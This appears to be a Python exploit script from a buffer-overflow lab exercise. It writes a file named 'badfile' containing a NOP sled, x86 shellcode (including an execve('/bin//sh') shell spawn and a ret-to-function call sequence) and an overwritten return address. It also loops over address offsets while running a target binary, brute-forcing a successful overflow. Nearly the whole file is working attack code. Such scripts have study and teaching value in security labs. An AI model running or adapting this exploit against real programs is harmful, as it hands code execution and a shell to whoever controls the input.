#!/usr/bin/python3

import sys
def get_content(num):
	# Replace the content with the actual shellcode
	shellcode= (
	  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
	  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
	  "\xd2\x31\xc0\xb0\x0b\xcd\x80"          
	).encode('latin-1')

	shellcode = (
"\x6A\x44\x31\xDB\xB3\x03\xC1\xE3\x08\x53\x68\xD4\xCB\x5B\x07\xB8\x8F\x63\x55\x56\xFF\xD0"	# ).encode('latin-1')
).encode('latin-1')


# push 68
# xor ebx, ebx
# mov bl, 0x3
# shl ebx,8
# push ebx
# push 123456468
# mov eax,0x5655638f
# call eax

	# Fill the content with NOP's
	content = bytearray(0x90 for i in range(800)) 

	##################################################################
	# Put the shellcode somewhere in the payload

	# Decide the return address value 
	# and put it somewhere in the payload
	# ret    = 0xffffced8+ num           # Change this number 
	ret= 0xffffcd03 + num # buffer
	# ret    = 0x56559010 # code
	# ret = 
	# foo = 0x5655638f

	offset1 = 469+4              # Change this number
	L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
	content[offset1:offset1 + L] = (ret).to_bytes(L,byteorder='little')
	start = offset1-50 - len(shellcode)               # Change this number 
	content[start:start + len(shellcode)] = shellcode
	offset1+=L
	# -> a
	a = 52
	content[offset1:offset1+L] = (a).to_bytes(L,byteorder = 'little')

	# content = content[0:offset1+L]
	
	print(content[offset1:offset1+L])
	##################################################################
	return content

import os,time,sys

if len(sys.argv) == 1:

	for i in range(427,1000):
		# Write the content to a file
		with open('badfile', 'wb') as f:
		  f.write(get_content(i))
		print("i=",i)
		s=time.time()
		# os.system("./B1-gdb")
		import subprocess
		subprocess.call(['./A1-gdb'])
		if time.time() -s > 1.0:
			break
else:
	with open('badfile', 'wb') as f:
		f.write(get_content(int(sys.argv[1])))
